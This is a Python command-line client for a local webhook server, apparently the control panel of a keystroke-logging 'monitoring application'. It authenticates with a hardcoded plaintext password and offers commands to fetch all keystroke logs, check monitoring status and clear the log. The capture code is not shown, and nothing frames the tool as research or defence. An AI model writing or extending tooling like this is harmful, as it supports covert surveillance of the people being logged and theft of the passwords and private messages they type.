#!/usr/bin/env python3
"""
Simple webhook command client for triggering monitoring commands
"""

import requests
import json
import sys

# Configuration
SERVER_URL = "http://localhost:8888"
SERVER_PASSWORD = "secure_pass_123"  # Must match server password

def send_command(command):
    """Send a command to the webhook server"""
    payload = {
        "password": SERVER_PASSWORD,
        "command": command
    }
    
    try:
        response = requests.post(SERVER_URL, json=payload, timeout=5)
        data = response.json()
        
        if response.status_code == 200:
            print(f"✓ Command '{command}' executed successfully")
            print(f"  Response: {data.get('message', 'OK')}")
        elif response.status_code == 401:
            print("✗ Error: Invalid password")
        else:
            print(f"✗ Error: {data.get('message', 'Unknown error')}")
            
    except requests.exceptions.ConnectionError:
        print(f"✗ Error: Could not connect to server at {SERVER_URL}")
        print("  Make sure the monitoring application is running")
    except Exception as e:
        print(f"✗ Error: {e}")

def main():
    if len(sys.argv) < 2:
        print("Usage: python webhook_client.py <command>")
        print("\nAvailable commands:")
        print("  keystrokes - Get all keystroke logs")
        print("  status     - Check monitoring status")
        print("  clear_log  - Clear keystroke log")
        sys.exit(1)
    
    command = sys.argv[1].lower()
    
    if command not in ["keystrokes", "status", "clear_log"]:
        print(f"✗ Unknown command: {command}")
        print("  Valid commands: keystrokes, status, clear_log")
        sys.exit(1)
    
    send_command(command)

if __name__ == "__main__":
    main()
